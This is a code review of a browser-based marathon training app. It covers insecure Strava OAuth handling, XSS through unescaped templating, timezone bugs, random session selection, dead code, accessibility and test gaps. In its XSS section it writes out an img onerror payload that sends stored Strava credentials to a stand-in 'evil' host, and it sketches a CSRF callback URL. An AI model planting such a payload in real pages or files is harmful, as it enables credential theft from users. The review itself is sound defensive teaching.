# Holistic code review — Marathon Training App

**Date:** 2026-04-19
**Reviewer:** Principal engineer, onboarding pass
**Scope:** full repo (engine, UI, data, tests, tooling)
**Tone:** blunt, because junior engineers learn more from specifics than from hedged feedback. The codebase is *coherent* — the three-layer rule is real and mostly respected — but it is riddled with bugs that only hide because nobody has hit them yet. Below is what I'd fix, in priority order, with reasoning a junior can learn from.

---

## 0. Executive summary

The good:
- Clear three-layer split (data / engine / UI) with `AGENT_GUIDE.md` making it navigable.
- Engine is mostly pure functions — easy to reason about in isolation.
- Test suite exists and is wired to the modules it tests.
- Zero build step keeps the cognitive overhead low for a small project.

The bad (what this review focuses on):
- **Multiple real security holes**, including a Strava OAuth implementation that persists the client secret in `localStorage`, an OAuth flow with no `state` param (CSRF), and a DOM pipeline that will happily render XSS from imported JSON.
- **Correctness bugs** in date/timezone handling, inter-block mileage progression, and the finish-time → pace-key derivation.
- **Non-determinism** baked in via `Math.random()` inside session selection, which makes the entire plan non-reproducible and makes any end-to-end test structurally impossible.
- **Dead code and tombstones** across engine, tests, and data — three competing places to add engine tests, two "legacy" functions still exported, three params named "legacy compat".
- **UI is brittle**: 665-line template-literal renderer, unescaped interpolation, inline `style=`/`onclick=` everywhere, global `window.*` handlers, no a11y, no CSP.

The *architecture* is fine. The *execution* is what needs work.

---

## 1. Security issues (fix these first)

### 1.1 Strava client secret persisted in the browser — **critical**

`src/strava.js:15` stores the OAuth **client secret** in `localStorage`:

```js
export function saveStravaCredentials(clientId, clientSecret) {
  const existing = loadStravaSettings();
  localStorage.setItem(STRAVA_KEY, JSON.stringify({ ...existing, clientId, clientSecret }));
}
```

This is a categorical mistake. Client secrets are for *confidential* clients (servers), not browsers. Anything in `localStorage` is readable by any script running on the page — including any XSS payload delivered via the issues in §1.3. The moment one person's XSS lands, their Strava credentials (and thus access to their full activity history) are exfiltrable.

**Learning:** if your OAuth flow needs a secret to exchange a code for a token, that exchange must happen on a server you own. Browsers use the **PKCE** flow (RFC 7636): you generate a code verifier, send a hash of it with the auth request, and the authorization server requires the verifier at token-exchange time. No secret ever touches the client.

**Fix:** either (a) stand up a minimal serverless endpoint (Vercel/Cloudflare) that holds the secret and handles the token exchange, or (b) use Strava's PKCE support and scrub the client-secret input from the UI. The current approach is not a "simpler alternative" — it's a different feature (personal-app mode), and it should at least be labelled as such with a warning.

### 1.2 OAuth flow has no `state` parameter — **high**

`src/strava.js:47`:

```js
const params = new URLSearchParams({
  client_id: settings.clientId,
  redirect_uri: redirectUri,
  response_type: 'code',
  scope: 'activity:read_all'
});
```

No `state`. OAuth 2.0 mandates `state` precisely to defend against CSRF on the redirect: without it, an attacker can get a victim to visit `https://app/?code=ATTACKER_CODE&scope=activity:...` and the app will happily POST it to Strava using the *user's* stored client secret. That gets the attacker's code exchanged against the victim's app registration.

Compounded by `src/app.js:442`:
```js
if (urlParams.has('code') && urlParams.get('scope')?.includes('activity')) {
  try { await handleStravaCallback(urlParams.get('code')); ... }
```

No `state` check, no origin check, nothing. Any link to the app with a `code=...&scope=activity:read_all` query fires the exchange.

**Fix:** generate a random `state`, store it in `sessionStorage`, include it in the auth URL, and reject the callback if it doesn't match.

### 1.3 XSS via unsanitised HTML templating — **high**

The renderer is one giant `innerHTML` assembly pipeline. `src/ui/renderers.js:557`:

```js
<div class="session-summary" ...>${day.sessionSummary||day.focusArea}</div>
...
<div class="detail-description">${day.sessionDescription||''}</div>
...
<div class="pace-block">${day.paces}</div>
```

Today these strings come from shipped JSON, so nothing fires. But:

1. `window.importPlan` (`src/app.js:386`) accepts arbitrary user-chosen JSON and drops it straight into the store with no schema validation. A plan with `sessionDescription: "<img src=x onerror=fetch('//evil/'+localStorage.getItem('marathon-strava'))>"` will run. Combined with §1.1, that's full credential theft via a shared `.json` file.
2. `athlete.firstname` / `athlete.lastname` come from Strava (`src/ui/renderers.js:605`). Strava sanitises these, but "third-party API data" is not the same as "trusted HTML".
3. `race.monthYear` in `renderCreateScreen` is similarly dumped unescaped. Today `data/races.json` is trusted, but it's the kind of content a non-engineer may one day edit.

**Fix:** introduce a tiny `escapeHtml()` utility and wrap every user/data-derived interpolation. Better: switch to `textContent` for text and build DOM nodes with `document.createElement` for the parts that need it. Template literals + `innerHTML` are the wrong tool once *any* input isn't hard-coded.

### 1.4 No Content-Security-Policy

`index.html` has no CSP meta. Combined with inline event handlers (`onclick="window.foo()"`) and inline `style=` everywhere, there's nothing to mitigate §1.3 if it lands. Even a permissive CSP (`default-src 'self'; style-src 'self' 'unsafe-inline'; font-src fonts.gstatic.com; connect-src 'self' https://www.strava.com`) would block inline-script exfil.

### 1.5 Import path has no schema validation

`store.importPlan(jsonStr)` (`src/store.js:151`): `JSON.parse` + truthy check on `data.plan`, then blind save. A malformed plan (missing `weeks`, missing `planMeta.raceDate`, garbage `days`) will pass this check and blow up at render time with a confusing stack. Given imports are also the XSS vector in §1.3, the schema check is double-purpose: correctness *and* security.

**Fix:** validate shape with a guard function (`isPlan(x)` asserting the keys and types you actually read). Consider a `planVersion: 1` field to gate imports.

---

## 2. Correctness bugs (wrong behaviour, not just ugly code)

### 2.1 Date / timezone handling is wrong for any non-UTC user

Three places, same underlying problem.

**a)** `src/ui/components.js:26`:
```js
export function daysUntil(dateStr) {
  const target = new Date(dateStr); target.setHours(0,0,0,0);
  const now = new Date(); now.setHours(0,0,0,0);
  return Math.ceil((target - now) / 86400000);
}
```
`dateStr` here is `'YYYY-MM-DD'` from the `<input type="date">`. `new Date('2026-08-15')` per spec is parsed as **UTC midnight**, then `setHours(0,0,0,0)` mutates it to **local midnight of that same Date instance**. For a user in UTC+12, the instance was `2026-08-15T00:00:00Z`, equivalently `2026-08-15T12:00 local`, so `setHours(0,0,0,0)` moves it *backwards* to `2026-08-15T00:00 local`, which is `2026-08-14T12:00Z`. For a user in UTC-12 it moves the other way. Result: off-by-one-day race countdown for users far from UTC.

**b)** `engine/dateScaffold.js:31` and `src/app.js:261`:
```js
const today = new Date();                       // app.js
const target = new Date(raceDate);              // dateScaffold.js
target.setHours(0,0,0,0);
```
Same mix-up. `today` is local-now, `target` is UTC-midnight-coerced-to-local. Subtract them and you get fractional day offsets.

**c)** Also in `createDateScaffold`:
```js
while (current <= target) {
  ...
  current.setDate(current.getDate() + 1);
}
```
`setDate(+1)` adds a calendar day, but at the DST transition in a Western-European timezone, this produces 23- or 25-hour jumps. Combined with `toISOString().split('T')[0]` (which is always UTC), the `dateStr` emitted during the DST-spring-forward can be off by one day. The `dayOfWeek` uses `getDay()` (local) but `dateStr` uses UTC. For a plan spanning March, Monday's `dateStr` can be Sunday's UTC date.

**Learning:** *parse as UTC, format as UTC, iterate via UTC fields* (`getUTCDate`, `setUTCDate`). Or use a library (Temporal, date-fns, luxon) and never roll date arithmetic yourself. Always separate "instant in time" (Date) from "calendar date" (string). This codebase confuses the two on every line that touches a date.

**Fix:** pull every date arithmetic into one file, operate entirely in UTC, and only convert to local for display.

### 2.2 Mileage progression plateaus between blocks

`engine/mileageProgression.js:85`:
```js
const achievableMax = rampWeeks > 0
  ? currentMileage * Math.pow(1.1, rampWeeks)
  : currentMileage;
const blockMax = Math.min(userTargetMaxMileage, Math.max(currentMileage, achievableMax));
...
currentMileage = deload2; // deload2 = 0.70 * blockMax
```

For a user with `startMileage=40, target=60, blocks=[8,10,12]`:

- Block 1 ramp = 6 weeks. `achievableMax = 40 * 1.1^6 ≈ 70.8`. `blockMax = min(60, 70.8) = 60`. Peak = 60.
- Block 1 deload2 = 42. Carry forward.
- Block 2 ramp = 8 weeks. `achievableMax = 42 * 1.1^8 ≈ 90.1`. `blockMax = 60`. Peak = 60.
- Block 3: identical.

So **every block peaks at 60 km** — the "progressive ramp across blocks" promised by the comment doesn't exist whenever `userTargetMaxMileage` is actually reachable in block 1. That's the normal case for short runners ramping conservatively.

The test `never exceeds user target mileage` (tests/index.html:304) passes because the *cap* works. There is no test asserting that successive blocks *differ*, so the plateau slid in unnoticed.

**Learning:** write a test that checks the *shape* of your output, not just the bounds. "Block 2 peak >= block 1 peak" would have caught this.

**Fix:** decide what "progressive" means. Either (a) increase the block peak by a fixed % each block up to the user cap (and never start a new ramp from 70% of peak — runners deload *into* the next block, they don't back up and re-ramp), or (b) document that blocks past the first are the same peak as block 1 and the variation is in the *quality* work only.

### 2.3 Target-time → pace-key derivation is wrong for non-marathon races

`src/app.js:274`:
```js
let distKm = 42.195;
if (d.raceDistance === '1/2 Marathon') distKm = 21.0975;
else if (d.raceDistance === '10km') distKm = 10;
else if (d.raceDistance === '5km') distKm = 5;
const pacePerKmSecs = totalSecs / distKm;
...
const marathonSecs = pacePerKmSecs * 42.195;
```

Translation: "compute pace per km for the target race, then scale linearly to marathon time". That presumes you run the same pace for 5k as you do for a marathon, which no human does. The standard model is **Riegel** (`T2 = T1 * (D2/D1)^1.06`) or **Daniels VDOT**. For a 20-minute 5k that's 2:52:xx marathon via Riegel — but linear scaling yields 2:48:31, which buckets into a different pace bracket entirely and hands the user a plan calibrated for a much faster runner.

**Learning:** domain logic encoded as arithmetic deserves a doc comment naming the formula. "Convert half-time to marathon-equivalent" has a name — use it, or cite a source.

**Fix:** implement Riegel (`t_marathon = t_race * (42.195 / distKm) ** 1.06`). One line change, meaningful accuracy win.

### 2.4 Session selection is non-deterministic

`engine/sessionSelector.js:125`:
```js
const idx  = Math.floor(Math.random() * table.length);
```

Re-generating the same plan gives different sessions. Consequences:

- Users can't share "the" plan with a training partner.
- Any end-to-end test is either flaky or has to stub `Math.random`.
- A/B-ing changes to the engine is impossible — you can't tell if a difference came from the diff or from the RNG.
- The existing "fallback: pick closest match" path is dead on most runs because random sampling almost always finds *something* within tolerance.

The CLAUDE.md file itself acknowledges this: *"random session picks use `Math.random()` instead of `Rnd`"*. That's not a justification, it's a known defect.

**Fix:** seed with a hash of the input (raceDate + targetMileage + currentPace). Use a small PRNG like `mulberry32`. Expose the seed in `planMeta` so users can regenerate an identical plan. Then the tolerance-widening loop becomes deterministic and testable, and the "closest match" fallback is reachable.

### 2.5 Strava sync matches on date only

`src/strava.js:135`:
```js
const matched = runActivities.some(a => {
  const actDate = a.start_date_local.split('T')[0];
  return actDate === day.date;
});
```

Any `type === 'Run'` activity on the scheduled date marks the session complete. 800 m shakeout while walking the dog? Marked complete. Two runs same day? Single match. No distance sanity-check, no time-of-day, no duration correlation.

**Fix:** at minimum, require `activity.distance >= 0.5 * day.totalDistance * 1000`. Better: pick the best-matching run (closest distance) per day and store the activity ID so the user can see *which* run was matched.

### 2.6 Completions keyed by array index break on regeneration

`src/store.js:131` uses `String(dayIndex)` as the completion key, where `dayIndex` is the position in `plan.days`. If the user ever regenerates the plan (or even loads a different saved plan), the completion map carries over stale indices that now point at different dates/sessions.

Admittedly `savePlan` does `this.completions = {}`, so completions are wiped on regeneration — but that's silent data loss masked as a bug fix, and the mapping is still positional rather than date-based.

**Fix:** key completions by `dateStr`. Then re-generation preserves "I did my Tuesday session" regardless of which session it now is.

### 2.7 OAuth callback loop on failure

`src/app.js:442`:
```js
if (urlParams.has('code') ...) {
  try { await handleStravaCallback(...); window.history.replaceState(...); }
  catch(e) { console.error(...); }
}
```

On failure, the `?code=...` stays in the URL (replaceState only runs on success). If the user refreshes, the now-invalidated code is re-posted to Strava, which returns an error, which is swallowed to console. The user sees nothing. Silent failure loop until they manually edit the URL.

**Fix:** always clear the query string before `await`, not after. Or on failure, surface a toast/error.

### 2.8 Taper can fire mid-block and desync mileage

`engine/taperProtocol.js` overrides normal scheduling for `dayIndex >= maxDayCount - 17`. The block optimiser slack of 5-10 days is usually enough that taper starts at a block boundary — but not guaranteed. When it doesn't, the computed `weeklyMileage` for that week reflects the block's plan, while the *actual* sum of `totalDistance` reflects the taper protocol. The dashboard bar chart sums the latter; the debug panel shows the former. Two answers to "what mileage is week N."

No test covers a taper landing mid-block. Add one.

### 2.9 `buildPaceGuidance` regex false positives

`engine/paceEngine.js:141`:
```js
{ pattern: /\b100\b/, label: "100's", idx: 0 },
```

A session description like *"Warm up 1000 m then 4×400"* matches both `\b100\b`? No — `\b` is a word boundary and `1000` matches `\b1000\b`, not `\b100\b`. But a description saying *"do 100 m strides after 5×400"* will match both 100 and 400, labelling the session with two paces. More worryingly, the Tempo branch's `/\b1000\b/` matches any description containing `1000 m`, so a Tempo session referencing its warmup will pick up an extra line.

There's no test for pace guidance output. Given how much domain meaning is embedded, this is surprising.

### 2.10 `extractReps` loop assumes contiguous keys

`engine/sessionSelector.js:76`:
```js
for (let n = 1; row[`Rep ${n}`] !== undefined && row[`Rep ${n}`] !== null; n++) {
```

If any row has `Rep 1, Rep 2, Rep 4` (skipped key), Rep 4 silently drops. Fragile. Consider `Object.keys(row).filter(k => /^Rep \d+$/.test(k)).sort(...)` and validate in `tools/validate-sessionTemplates.js`.

---

## 3. Architecture / design smells

### 3.1 The UI layer is one step away from needing a framework

665-line `renderers.js`. Full-screen `innerHTML` re-render on every interaction (`window.toggleGroupExpand` wipes and re-renders the entire dashboard). That means:

- Any `<input>` focus is lost mid-edit if anything triggers `render()`. The wizard mitigates this by only syncing on Next/Back, but it's fragile.
- Scroll position is lost on `openDay` — mitigated with a manual `scrollTo(0,0)` that's applied inconsistently.
- Every render parses a kilobytes-long HTML string. Fine for 10 weeks, noticeable for 40.
- Debugging layout bugs means reading template literals, not inspecting a component.

"No framework" is a reasonable decision for a 10-screen app. But **the code is doing the framework's job, badly**. Either go further in the "pure template" direction (split render functions by screen and component, use a tagged template helper that auto-escapes) or adopt the smallest possible framework (Preact + htm is ~4kb) so re-renders are diffed.

**Learning:** there's no prize for "no dependencies." Measure the complexity cost of the thing you rolled by hand against the cost of a dependency. 665 lines of unescaped template-literal HTML is *more* risk than a 4 kB library.

### 3.2 `window.*` as event bus

Every button onclick calls a function on `window`. This is the oldest pattern in the book and it has the oldest problems:

- Global namespace pollution.
- Trivial to test individually, impossible to test in combination (you can't mock `window.navigate` without leaking across tests).
- Inline `onclick=` means CSP can't be strict.
- Any interpolation bug in the onclick string (e.g. a race name containing `'`) breaks the button silently.

**Fix:** delegate events from a single `$app.addEventListener('click', ...)` with `data-action` attributes. Keep handlers as module-scoped functions. No `window` soup.

### 3.3 Legacy cruft with unclear lifetime

- `calculateGrowthRate` and `progressWeeklyMileage` in `mileageProgression.js` are documented "legacy, kept for backward compat + old tests". The "old tests" are in `tests/engine.spec.js` and `tests/engine_spec.js` — both of which `CLAUDE.md` explicitly calls out as legacy/orphan. So: legacy code exists to serve legacy tests that nobody runs. **Delete all of it.**
- `planType: 'Candidate'`, `startCount: slackDays`, and `planBlockLength: Math.max(...)` in `optimizeBlocks` return value are all flagged `// Legacy compat`. Grep for their consumers — if the UI and engine no longer read them, drop them in a single commit and move on.
- `_excessMileage` param to `calculateDistances`: "legacy param — ignored; kept for API compat". API compat with what? Delete.
- `tests/engine_spec.js` (underscore) is orphaned per docs. Delete it.
- `tests/engine.spec.js` is the "legacy runner." Either promote its tests into `tests/index.html` or delete it. Three places to write tests is two too many.
- `data/extracted_data.json` (178 KB) is checked in, not read at runtime, and only used by the extraction tool. Move it out of `data/` or gitignore it.

**Learning:** "keeping it around in case" is how codebases rot. If you haven't deleted legacy code within one sprint of its replacement landing, you won't delete it at all — and every new engineer pays the cost of reading it.

### 3.4 Mutable state captured by closure for pace tables

`engine/planGenerator.js:90`:
```js
let { speedPaces, sePaces, tempoPaces } = (() => { ... })();
function refreshPaces() { speedPaces = ...; sePaces = ...; tempoPaces = ...; }
```

`processDay` calls `buildPaceGuidance(focusArea, desc, { speedPaces, sePaces, tempoPaces }, ...)`. The object literal captures *current* values of the `let`s at the time `processDay` runs — which is fine — but the mutation pattern is a trap waiting to be sprung: swap the literal for a captured reference once and you've got a heisenbug. Replace with an object mutated in place, or make pace resolution a pure function of `currentPaceIndex`.

### 3.5 Units hidden in variable names

`session.totalDistance` is **km** after `buildResult` divides by 1000. `session.sessionDistance` is **meters**. `distances.intensityMileage` is **meters** (despite the name "mileage"). `distances.longRunMileage` is **km**. `totalWeeklyMileage` is **km**. `weeklyData[i].weekMileage` is **km** (integer).

`CLAUDE.md` knows:
> Units — `Session Distance` / `Total Distance` are metres; pace `Upper`/`Lower` are seconds. The UI divides by 1000 for km display.

Except the UI *doesn't* always divide — `buildResult` already did. Mixing units across field names that share the word "Mileage" is how people introduce factor-of-1000 bugs.

**Learning:** encode units in names (`distanceKm`, `distanceM`, `paceSec`) or use a branded type in TS. If you can't do that, at minimum document units on every struct definition.

### 3.6 `debug` fields persisted to production state

`finalDay._debug = { ... }` is attached to every day in the plan (`engine/planGenerator.js:243`). That object is:
- Serialised to `localStorage` on every save.
- Serialised into the exported JSON.
- Rendered in a Debug Panel in Settings.

For a 40-week plan that's ~280 × ~10 fields of leaked internals. Harmless, but:
- It bloats `localStorage` toward the 5 MB quota.
- It leaks naming/structure decisions into exported files that users will share.
- `window.exportPlan`'s `.json` download is effectively a debug dump, not a portable plan.

**Fix:** attach debug only when a `?debug=1` query is present, or strip before save/export.

### 3.7 Weak boundary between wizard draft and engine input

`window.generatePlan` does:
```js
raceDistance: d.raceDistance === '5km' ? '5km' : d.raceDistance === '10km' ? '10km' : d.raceDistance,
```
This ternary does nothing — it maps `'5km'` to `'5km'`, `'10km'` to `'10km'`, and everything else to itself. Evidence that someone was *about* to normalise and didn't.

Everywhere the wizard draft is mapped to engine input is hand-rolled. No input type, no validation schema. The engine re-does validation (56-day minimum) because it can't trust the wizard. Either:

- Give the engine an `EngineInput` type (TS or JSDoc-typed) and validate at the boundary with a single function, or
- Let the wizard call the engine via a single narrow API that returns `{plan}` or `{errors[]}`.

### 3.8 Inline styles defeat the design-token system

The `styles/tokens.css` file is good. But `renderers.js` is full of `style="margin-top:var(--sp-6)"` and `style="font-size:0.55rem"`. Two problems:

1. Some of those values aren't tokens (`0.55rem`, `0.5rem`). One-off font sizes in renderer code mean any future "make everything bigger" change has to grep the renderer.
2. Every inline style is a CSP violation waiting to happen (see §1.4).

**Fix:** move all of them to `components.css` / `app.css` and use classes. If a size only appears once, it still belongs in CSS — that's *where sizes live*.

### 3.9 Accessibility is entirely absent

- `<div class="day-tile" onclick="window.openDay(N)">` has no `role`, no `tabindex`, no key handler. Keyboard users can't reach it.
- `<button>` with only an icon (`<button>${icon('home')}<span>Home</span></button>`) is better — but `<span>` inside `<button>` isn't labelled for screen readers in every AT combo.
- The rep chart uses `role="img"` and `aria-label` — good! — but the surrounding flow doesn't.
- Colour-only focus area badges (red = Speed, purple = SE) fail WCAG 1.4.1.
- The "completion" check toggle has no `aria-pressed` state.

**Learning:** accessibility isn't "a later concern." It's much cheaper to bolt on during initial scaffolding than to retrofit.

---

## 4. Edge cases that are likely not handled

A dedicated section because the prompt explicitly asked about what's been missed. I tried to think of every input/state combination that would make this engine produce wrong or broken output.

| # | Edge case | What happens today | Likely fix |
|---|-----------|--------------------|------------|
| 1 | Race date **today or in the past** | `<input type="date" min="...">` stops it in-browser but HTML `min` is bypassable. `createDateScaffold` returns `[]` → `maxDayCount = 0` → error "Race date too close". Acceptable but error mentions 8 weeks rather than "past". | Explicit check. |
| 2 | Race date **exactly 56 days out** | Passes the `< 56` guard. Block optimiser picks a single 8-week block = 56 days, slackDays = 0. Taper then fires on day 39 of the 8-week block, overriding the last 3 weeks. Result: user gets 5 weeks of "block" then 3 weeks of taper. Is that the intent? Nobody's said. | Document, or raise the minimum to "race date + taper length". |
| 3 | DST transition inside the plan | `current.setDate(+1)` in `createDateScaffold` is local-TZ sensitive; `dateStr` uses UTC. In a 40-week plan you hit two DST transitions. Expect off-by-one `dateStr` vs `dayOfWeek` on those weeks. | Use UTC arithmetic end-to-end. |
| 4 | User in UTC+12 or UTC-12 | `daysUntil` returns a value that's off by 1. Race countdown shows "0 days" a day early or late. | See §2.1. |
| 5 | User's `currentPace` slower than the slowest pace bracket (04:30:00) | `findPaceIndex` returns `{paceIndex: 13, headerValue: '04:30:00'}`. Then `calculatePaceUplift` with targetPace slower than header returns `maxDayCount` (never uplifts). OK — but a user with a 5:00:00 pace gets a plan calibrated for a 4:30 runner. No warning. | Raise an input error or show a banner. |
| 6 | User's `targetPace` equal to `currentPace` | `calculatePaceUplift` increments = 0 → returns `maxDayCount` → `daysUntilPaceUplift` huge → `paceAtDay` divides by `daysUntilPaceUplift || 1` and `ii = dayIndex % daysUntilPaceUplift` → pace never moves. Plan is "maintain current fitness". Probably fine behaviour, but untested. | Test it. |
| 7 | User's `targetPace` faster than 02:30:00 | `findPaceIndex` can return `paceIndex = 1`. Uplift logic then does `Math.max(1, paceIndex - 1)` — never goes below 1. But a 2:25 target and a 2:50 current means a huge `diffSecs`, `increments = round(diffSecs/600) = 2.5 → 3`. `daysUntilPaceUplift = maxDayCount / 3`. User uplifts from paceIndex=X toward paceIndex=1 and plateaus. Silent cap. | Surface a "target outside supported range" warning. |
| 8 | `raceDistance === '5km'` | The engine still generates a full marathon-style plan (15+ weeks, 42.2km race day in taper). `getTaperSession(0, …)` hardcodes `totalDistance: 42.2` regardless of race distance. **Bug.** | Parameterise race-day distance. |
| 9 | User imports a plan generated with a different schema version | No version check; blind overwrite. | See §1.5. |
| 10 | `localStorage` quota exceeded on save | `try/catch` with `console.warn`. Plan silently not saved. User refreshes, plan gone. | Surface via UI. |
| 11 | Two plans in flight in two tabs | Each tab has its own `store` object; last write to `marathon-plans-index` wins. Open tab A, edit; open tab B, save; tab A completions reference a plan no longer in the index. | Use `storage` event to sync, or warn. |
| 12 | User rotates device / resizes | Chart bars are percentage-based — fine. But the day-tile layout uses flex with no responsive fallback for very narrow viewports (<320px). | Media queries. |
| 13 | Race name or race monthYear contains `<`, `"`, `'` | Breaks the option tag or the onclick string. | Escape. |
| 14 | Strava athlete firstname contains HTML | Rendered unescaped in Settings. | Escape. |
| 15 | User's system clock is skewed | Token refresh check `Date.now() / 1000 < expiresAt - 60` may incorrectly reuse an expired token. | Accept 401 → refresh → retry. |
| 16 | Pace table name missing from `paceTables.json` | `loadPaceTable` returns `null` → pace guidance silently blank for affected sessions. | Log a warning; consider a validation tool. |
| 17 | Session template with `Session Distance` of 0 (empty row) | `selectSession` happily includes it if tolerance matches. | Filter `table` to rows with `Session Distance > 0` at load. |
| 18 | Taper day whose `prevFocus` is from a *rest* day | The `prevFocus === 'Long Run'` guard doesn't fire, but the previous day could be a lower-intensity day. Nothing special — but the guard is overly narrow. Why only Long Run? | Document or broaden. |
| 19 | Plan generation takes >100 ms on a low-end phone | Synchronous. Blocks the main thread. UI freezes. | `await new Promise(r => setTimeout(r, 0))` at the top, or move to a worker. |
| 20 | `config.json` has a distance field that `findPaceIndex` can't find | Falls back to `paceIndex: 8`. No warning. Plan is quietly miscalibrated. | Log; expose in debug panel. |
| 21 | Plan with 0 session-weeks block (hypothetical, not producible now but no guard) | `rampWeeks = -2` → `Math.pow(1.1, -2)` → `achievableMax < currentMileage`. The `Math.max(currentMileage, achievableMax)` rescues it. Lucky. | Defensive: `rampWeeks = Math.max(0, sessionWeeks - 2)`. |
| 22 | The `<input type="date">` produces an empty string (iOS Safari edge case when user dismisses the picker) | `d.raceDate = ''`, validation fires with "Please select a race date". Fine. |  |
| 23 | User clicks "Generate Plan" twice quickly | `btn.disabled = true` only after `syncDraftFromDOM()` and try/catch enters. The `await loadData()` is non-blocking to clicks on a slow mobile. Second click → second plan in flight. | Guard on a module-scoped `isGenerating` flag. |
| 24 | Completion toggled, then plan is wiped mid-flight | `toggleCompletion` writes to `localStorage` using `this.planId`. If `clearPlan()` was called, `planId = null` and the write is skipped — but `this.completions` was already mutated. State drift. | After `clearPlan`, drop the stale click. |
| 25 | `window.findMyPlans` query string injection | `container.innerHTML = ...onclick="window.loadSavedPlan('${p.planId}')"...`. `planId` is `plan-<timestamp>` → safe. But `p.raceName || p.distance` is interpolated unescaped into `.plan-info`. | Escape. |

I could go on; the pattern is "input validated nowhere, errors handled by `console.warn`, untrusted data treated as HTML".

---

## 5. Testing gaps

The test suite is **better than I expected for a repo this size** — it tests the engine modules individually, uses clear groups, persists history to localStorage. Kudos.

But:

1. **No end-to-end test of `generateTrainingPlan`.** Given §2.4 (non-determinism), you literally cannot write one without seeding. Once you fix that, add: "given a fixed input, the generated plan has N weeks with expected block boundaries, mileage shape, and taper start."
2. **No property-based tests.** `isPyramidal` and `scoreCandidate` are begging for fast-check. "For every sequence of block lengths the optimiser produces, `isPyramidal(seq) || isUniform(seq)` holds" as a property rather than 5 hand-picked cases.
3. **No negative/edge tests.** Nothing for race-date-in-past, race-distance-not-marathon, user-in-UTC-plus-12, zero mileage, etc.
4. **No tests for `paceEngine` guidance output.** The most domain-sensitive module has zero tests.
5. **No tests for `weeklySchedule` Tuesday/Thursday focus dispatch.** The block-count × plan-block-count switch statement has ~15 branches; three tests would catch any typo.
6. **No tests for `store` persistence round-trip.** `importPlan` after `exportPlan` should be a no-op.
7. **Tests persist results to `localStorage` and have no reset on page navigation.** Useful as local history, but means the pass/fail counter is cumulative and potentially misleading.
8. **The test runner is a browser page.** Running tests is a manual chore. For a 2026-era project, wiring up Vitest + jsdom takes an afternoon and gives you a `npm test` that runs in CI. The browser-run suite can stay for humans; CI needs headless.

---

## 6. Minor issues worth noting but not breaking

- `engine/blockOptimizer.js` `generateCandidates` is recursive with no memoization. Only 363 candidates total so it doesn't matter, but the `shorter` array is regenerated each iteration of the outer loop in `optimizeBlocks`. One `generateAll()` call outside the loop would be cleaner.
- `engine/sessionSelector.js` tolerance loop: 20 random samples × 20 tolerance bumps = up to 400 RNG calls. Fine, but a linear filter of the table is one operation and always deterministic. Replace the whole loop with `table.filter(r => Math.abs(row["Session Distance"] - target) <= tolerance).sort(...)[0]`.
- `src/app.js:280` — `(parts[0] || 0) * 3600 + (parts[1] || 0) * 60 + (parts[2] || 0)`: if user types `3:30` (no seconds), `parts.length === 2` — handled. If user types `3:30:abc`, `parts[2] = NaN`, `(NaN || 0) = 0`. Silent. Validate with regex.
- `engine/paceEngine.js:44` — "fallback" `paceIndex: 8, headerValue: '03:40:00'`. Magic numbers as fallback values. Pull into `config.json`.
- `engine/dateScaffold.js:19` — `daysUntilMon = 8 - dow` for `dow ∈ [2..6]` yields 6, 5, 4, 3, 2. Correct. The formula is clever but an explicit lookup table `{1:0, 2:6, 3:5, 4:4, 5:3, 6:2, 0:1}` is more readable. Readability > cleverness in dateland.
- `AGENT_GUIDE.md` is genuinely excellent — every project should have one. **Don't lose that habit.** The only concern is drift: there's no automated check that every function it mentions still exists with the documented signature. A simple test `grep`s could close that.
- `README.md` contains marketing copy ("Why TF use Runna?") and dev docs ("architecture") intermixed. Split them or at least heading-separate them.
- `index.html` has `maximum-scale=1.0, user-scalable=no` — accessibility anti-pattern, prevents low-vision users from zooming. Drop both.
- `meta name="description"` of the app is `"Why TF use Runna? — Training plans for the stoke not the followers"` — fine for the vibe, but not a real description for anyone finding the app via search or preview.

---

## 7. What I'd ship first

Prioritised by value / cost, for a junior making their first round of PRs:

1. **Escape HTML in every string interpolation** (§1.3). One `escapeHtml` helper + careful search-and-apply. Biggest security win for smallest diff.
2. **Fix date/timezone handling** (§2.1). One PR that moves all arithmetic into `UTC` operations. Add tests for a UTC+12 user to prove it.
3. **Seed `Math.random`** (§2.4). Tiny mulberry32, seed from inputs, expose in `planMeta`. Unlocks every other test improvement.
4. **Add a schema check to `importPlan`** (§1.5). Defensive and cheap.
5. **Delete dead code** (§3.3). This is the highest "learning per line" exercise for a junior — you'll find more bugs just by reading the code you're about to delete.
6. **Fix the Strava OAuth model** (§1.1, §1.2). Either PKCE or move the secret server-side. This is bigger but should not wait long.
7. **Complete an accessibility pass** (§3.9). Add `role="button"`, `tabindex="0"`, keyboard handlers, `aria-pressed` on the completion toggle. One PR, couple hours.
8. **Write an end-to-end engine test** (§5.1). Once §2.4 is done, commit a known-good plan fixture and snapshot-test `generateTrainingPlan`.

---

## 8. What a junior should take away from this review

1. **Silent failures are worse than loud ones.** Half this list is "swallowed error, no UI feedback." When you catch an error, *do something with it*. If you don't need to, don't catch.
2. **Dates and timezones are a specialty, not a tax.** Anyone who thinks they can roll their own date math in JS is about to find out otherwise. Use UTC or a library, and write one test for a non-local-time user.
3. **Unescaped HTML is the single most common web vulnerability.** The moment your code says `innerHTML = \`...${x}...\``, escape `x` or prove it's safe. "It's from JSON" is not a proof.
4. **OAuth in a browser means PKCE.** If your tutorial says "put your client secret here," that tutorial is about server-side OAuth.
5. **Non-determinism is a debugging *and* a testing tax.** If you use `Math.random`, you've opted out of reproducible output. Seed it.
6. **"Legacy, kept for backward compat" is a smell.** It means someone didn't delete something. Either delete it or document *why* it stays and when it goes. Drift happens; unclear intent compounds it.
7. **Test the shape of output, not just the bounds.** "No week exceeds 60 km" is necessary but not sufficient if every block plateaus at 60 km.
8. **Accessibility is correctness.** A `<div onclick>` that works in Chrome for you is broken for keyboard users, screen-reader users, voice-control users, and anyone on a tablet with a keyboard attached. Use `<button>`.
9. **Document units.** `distance` is not a type. `distanceKm` is. Future-you and every other reader will thank you.
10. **A 665-line renderer is not a virtue of simplicity.** "No dependencies" and "low cognitive load" are different things.

---

*End of review. Nothing here is irreparable. This is a small, well-structured app with a pile of fixable bugs — the kind of codebase where one good month of cleanup gets you a genuinely solid foundation.*
